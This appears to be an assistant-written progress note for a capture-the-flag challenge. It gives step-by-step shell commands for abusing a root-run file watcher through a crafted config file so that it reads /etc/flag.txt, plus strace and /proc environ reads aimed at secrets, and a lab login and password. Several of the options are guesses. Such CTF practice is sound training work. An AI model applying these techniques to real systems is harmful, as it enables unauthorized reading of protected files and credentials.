# Stolen Schematics - Next Steps (CURRENT STATUS)

## What We Know So Far

✅ **Docker Registry Analysis Complete** - Successfully ran the Python script that revealed:
```
'  printf \'FLAG=%s\\n\' "$FLAG" > /opt/mc/.sync/sync.result 2>/dev/null'
'  cat /etc/flag.txt >> /opt/mc/.sync/sync.result 2>/dev/null'
'  chmod 644 /opt/mc/.sync/sync.result 2>/dev/null'
```

✅ **sync-loop.sh is RUNNING** - Confirmed PID 16, running as root

✅ **Exploit was launched** - 80-iteration loop writing sync-request.conf

❌ **Problem**: Cannot read `/opt/mc/.sync/sync.result` - Permission denied

## Why the Flag Isn't Appearing Yet

The watcher script (`sync-loop.sh`) needs to:
1. **Detect** the sync-request.conf file
2. **Parse** it and recognize the commands
3. **Execute** the flag reading logic
4. **Write** to sync.result
5. **chmod 644** to make it readable

This process may take **5-30 seconds** depending on the watcher's loop interval.

## IMMEDIATE ACTION PLAN

### Option 1: Wait and Monitor (RECOMMENDED)

SSH into the instance and run this monitoring command:

```bash
ssh player@instance.ctf.tdho.st -p <PORT>
# Password: reyalp

# Then run this monitor loop:
for i in {1..60}; do 
    echo "=== Check $i/60 ==="; 
    ls -la /opt/mc/.sync/ 2>/dev/null; 
    if [ -r /opt/mc/.sync/sync.result ]; then 
        echo "[+] FLAG FOUND!"; 
        cat /opt/mc/.sync/sync.result; 
        break; 
    fi; 
    sleep 1; 
done
```

### Option 2: Check Alternative Locations

The watcher might output to different locations:

```bash
# Check all possible output locations
cat /opt/mc/logs/latest.log | grep -i TDHT
cat /opt/mc/logs/sync.log 2>/dev/null | grep -i TDHT
find /opt/mc -type f -readable 2>/dev/null | xargs grep -l "TDHT" 2>/dev/null
find /tmp -type f -readable 2>/dev/null | xargs grep -l "TDHT" 2>/dev/null
```

### Option 3: Re-trigger with Correct Format

Based on the Docker analysis, the watcher expects certain config parameters. Try:

```bash
# Method A: Match the exact format from watcher.sh
cat > /opt/mc/config/sync-request.conf << 'EOF'
SYNC_ACTION=READ_FLAG
SYNC_OUTPUT=/opt/mc/.sync/sync.result
EOF

# Wait 10 seconds
sleep 10
cat /opt/mc/.sync/sync.result 2>/dev/null || echo "Not ready yet"
```

### Option 4: Check if Watcher Uses Environment Variables

The script references `$FLAG` environment variable:

```bash
# Check if FLAG is set anywhere
env | grep -i FLAG
cat /proc/16/environ | tr '\0' '\n' | grep -i FLAG
strings /proc/16/environ | grep -i TDHT
```

### Option 5: Monitor the Watcher Script's Behavior

```bash
# Watch what files the watcher is accessing
strace -p 16 2>&1 | grep -E "(open|read|write)" &
STRACE_PID=$!

# Let it run for 10 seconds
sleep 10

# Stop strace
kill $STRACE_PID

# Check the output for clues about what files it's using
```

## Current Instance Info

**Last Known Port**: 32902 (may have expired - check CTF platform for new port)

**Connection Command**:
```bash
ssh player@instance.ctf.tdho.st -p <NEW_PORT>
```

**Password**: `reyalp`

**Time Limit**: 10 minutes per instance

## What to Do RIGHT NOW

1. **Get a fresh instance** from the CTF platform
2. **Note the new port number**
3. **SSH in immediately**
4. **Run Option 1 (monitoring loop)** - this will catch the flag as soon as it appears
5. **If nothing after 30 seconds**, try Option 2 (alternative locations)
6. **If still nothing**, try Option 3 (re-trigger with correct format)

## Expected Flag Format

```
TDHT{...}
```

## Quick Copy-Paste Commands

### Complete One-Liner for Fresh Instance:

```bash
ssh player@instance.ctf.tdho.st -p <PORT>
# Enter password: reyalp

# Then paste this:
printf "talldwarf-sync-command=FILE-READ:/etc/flag.txt\ntalldwarf-remove-cmd-sync-restrictions__DEPRECATED__=true\ntalldwarf-sync-output=/opt/mc/.sync/sync.result\n" > /opt/mc/config/sync-request.conf && for i in {1..60}; do echo "[$i] Checking..."; if [ -r /opt/mc/.sync/sync.result ]; then echo "[+] FLAG:"; cat /opt/mc/.sync/sync.result; break; fi; ls -la /opt/mc/.sync/ 2>/dev/null | grep result; sleep 2; done
```

This will:
1. Write the exploit config
2. Monitor for 2 minutes (60 checks × 2 seconds)
3. Show the flag immediately when readable
4. Display directory contents each iteration

## Troubleshooting

**If you see "Permission denied" continuously:**
- The watcher may not be processing your config format
- Try different parameter names based on what the Docker analysis revealed
- Check if the config file is being deleted (sign that watcher is reading it)

**If sync-request.conf keeps disappearing:**
- GOOD! This means the watcher IS reading it
- The results should appear soon in sync.result
- Keep monitoring with `ls -la /opt/mc/.sync/`

**If you see sync.result created but unreadable:**
- Wait a few more seconds - chmod 644 may not have executed yet
- Check file owner: `ls -la /opt/mc/.sync/sync.result`
- Try reading as different user (unlikely to help but worth trying)

## Need Fresh Instance?

Go to the CTF platform, click "Reset Instance" or "Start Instance", note the new port, and use the one-liner above immediately.

Good luck! 🚀
